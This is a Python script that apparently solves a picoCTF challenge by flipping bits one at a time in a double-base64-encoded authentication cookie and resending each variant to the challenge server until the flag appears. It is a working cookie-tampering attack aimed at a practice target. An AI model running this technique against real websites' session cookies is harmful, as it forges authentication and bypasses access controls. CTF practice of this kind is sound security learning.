from base64 import b64encode, b64decode
import requests
from time import sleep

def flip_bit(char_offset, bit_offset, decoded_cookie):
    XOR_value = [0 if i != char_offset else 2**bit_offset for i in range(len(decoded_cookie))]
    new_cookie = [(cookie_byte ^ XOR_byte).to_bytes(1, "big") for cookie_byte, XOR_byte in zip(decoded_cookie, XOR_value)]
    new_cookie = b"".join(new_cookie)
    return new_cookie

def check_modified_cookie(char_offset, bit_offset, decoded_cookie):
    modified_cookie = flip_bit(char_offset, bit_offset, decoded_cookie)
    #print(modified_cookie)
    encoded_cookie = b64encode(b64encode(modified_cookie)).decode('ascii')
    header = {'Cookie': f'auth_name={encoded_cookie}'}
    sleep(0.2)
    response = requests.get('http://mercury.picoctf.net:34962/', headers=header)
    if 'picoCTF' in response.text:
        print("here")
        return get_flag(response.text)
    else:
        return None

def get_flag(content):
    index = content.index("picoCTF")
    while content[index] != "}":
        print(content[index], end="")
        index += 1
    print("}")

def main():
    s = requests.Session()
    s.get('http://mercury.picoctf.net:34962/')
    cookie = s.cookies["auth_name"]
    #cookie = "NnlNWmd3Mm45bm1odmcyb0pxcWtLK00zenk2OUd2aWoyN3lsWUZycU93OTlYQTBxcXNyV25Fa0ZVdnFGUWtJQzk3WU1OMFpab0c5WjVyM0h0QWdNNU5zQ0NIT095NnJlSzVjL0hucmNmdnVCa2JOUkp4ZjY0SkQvYXV4elNzNEU="
    decoded_cookie = b64decode(b64decode(cookie))

    for char_offset in range(0, len(decoded_cookie)):
        for bit_offset in range(8):
            #print(f"Char Offset: {char_offset}, Bit Offset: {bit_offset}")
            response = check_modified_cookie(char_offset, bit_offset, decoded_cookie)
            if not response == None:
                print("Flag Found!")
                print(f"Char offset: {char_offset}")
                print(f"Bit offset: {bit_offset}")
                print(f"Flag: {response}")
                return
    print("Flag not found!")


if __name__ == "__main__":
    main()




